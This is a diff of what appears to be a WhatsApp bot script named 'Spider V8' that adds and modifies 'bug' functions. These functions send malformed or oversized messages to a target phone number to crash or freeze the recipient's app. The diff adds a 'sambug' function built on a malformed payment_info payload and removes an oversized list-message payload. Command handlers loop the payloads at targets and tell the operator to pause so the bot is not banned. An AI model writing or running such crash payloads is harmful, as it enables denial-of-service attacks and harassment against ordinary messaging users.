@@ -561,47 +561,62 @@ await sam.relayMessage(target, etc.message, { participant: { jid: target }, mess
 async function bugPayment(chats) {
 await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: chats} })
 } 
-
-async function baklis(target, kuwoted) {
- var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-  'listMessage': {
-    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+"".repeat(920000),
-        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'buttonText': null,
-        'listType': 2,
-        'productListInfo': {
-          'productSections': [{
-            'title': 'anjay',
-            'products': [
-              { "productId": "4392524570816732" }
-            ]
-          }],
-          'productListHeaderImage': {
-            'productId': '4392524570816732',
-            'jpegThumbnail': null
-          },
-          'businessOwnerJid': '0@s.whatsapp.net'
-        }
-      },
-      'footer': 'puki',
-      'contextInfo': {
-        'expiration': 604800,
-        'ephemeralSettingTimestamp': "1679959486",
-        'entryPointConversionSource': "global_search_new_chat",
-        'entryPointConversionApp': "whatsapp",
-        'entryPointConversionDelaySeconds': 9,
-        'disappearingMode': {
-          'initiator': "INITIATED_BY_ME"
-        }
-      },
-      'selectListType': 2,
-      'product_header_info': {
-        'product_header_info_id': 292928282928,
-        'product_header_is_rejected': false
-      }
-    }), { userJid: target, quoted: ryobug });
-await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+async function sambug(jid) {
+await sam.relayMessage(
+jid,
+{
+viewOnceMessage: {
+message: {
+messageContextInfo: {
+deviceListMetadataVersion: 0x2,
+deviceListMetadata: {}
+},
+interactiveMessage: {
+nativeFlowMessage: {
+buttons: [
+{
+name: "payment_info",
+buttonParamsJson: JSON.stringify({
+currency: "BRL",
+total_amount: { value: 0, offset: 100 },
+reference_id: "4P46GMY57GC",
+type: "physical-goods",
+order: {
+status: "pending",
+subtotal: { value: 0, offset: 100 },
+order_type: "ORDER",
+items: [
+{
+name: "",
+amount: { value: 0, offset: 100 },
+quantity: 0,
+sale_amount: { value: 0, offset: 100 }
+}
+]
+},
+payment_settings: [
+{
+type: "pix_static_code",
+pix_static_code: {
+merchant_name: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖒",
+key: "+254742491666",
+key_type: "X"
+}
+}
+]
+})
+}
+]
+}
+}
+}
+}
+},
+{
+participant: { jid: jid }
+},
+{ messageId: null }
+);
 }
 
 async function bugProduk(target, kuwoted) {
@@ -1380,8 +1395,7 @@ case 'trash': {
 				title: `𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8 🔥`,
 				sections
 			};
-
-			let msg = generateWAMessageFromContent(m.chat, {
+	let msg = generateWAMessageFromContent(m.chat, {
 				viewOnceMessage: {
 					message: {
 						"messageContextInfo": {
@@ -1395,7 +1409,7 @@ case 'trash': {
 								forwardingScore: 999,
 								forwardedNewsletterMessageInfo: {
 									newsletterJid: '120363320283062687@newsletter',
-									newsletterName: '𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8',
+									newsletterName: '☠️⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🦄',
 									serverMessageId: -1
 								},
 								businessMessageForwardInfo: {
@@ -1406,15 +1420,15 @@ case 'trash': {
 								text: ''
 							}),
 							footer: proto.Message.InteractiveMessage.Footer.create({
-								text: `𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8`
+								text: `⿻  ⌜ 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8 ⌟  ⿻`
 							}),
 							header: proto.Message.InteractiveMessage.Header.create({
-								title: `𝐓𝐑𝐀𝐒𝐇 : ${incTarget}\n`,
+								title: `\n😈⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡☠️\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
 								subtitle: `️`,
 								hasMediaAttachment: true,
 								...(await prepareWAMessageMedia({
 									image: {
-										url: "https://i.imgur.com/xdt2g23.jpeg",
+										url: 'https://i.imgur.com/xdt2g23.jpeg'
 									}
 								}, {
 									upload: sam.waUploadToServer
@@ -1437,6 +1451,7 @@ case 'trash': {
 		}
 		break
 
+			
 case 'self': {
 if (!isCreator) return reply(mess.owner) 
 sam.public = false
@@ -1607,11 +1622,11 @@ await reply(`Wait as Spider Process your Request.....`)
 await bugpayflow(Pe);
 for (let j = 0; j < 30; j++) {
 await BugPayment(target)
-await coresix(Pe, "p", 1020000, true);
-await coresix(Pe, "p", 1020000, true);
+await coresix(Pe, "", 1020000, true);
+await coresix(Pe, "", 1020000, true);
 await BugPayment(target)
-await coresix(Pe, "p", 1020000, true);
-await coresix(Pe, "p", 1020000, true);
+await coresix(Pe, "", 1020000, true);
+await coresix(Pe, "", 1020000, true);
 await sleep(500)
 }
 await reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
@@ -1646,9 +1661,9 @@ await reply(mess.bugrespon)
 await bugpayflow(target);
 await BugPayment(target)
 for (let j = 0; j < 30; j++) {
-await coresix(target, "p", 1020000, true);
-await coresix(target, "p", 1020000, true);
-await coresix(target, "p", 1020000, true);
+await sambug(target);
+await sambug(target);
+await sambug(target);
 }
 await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
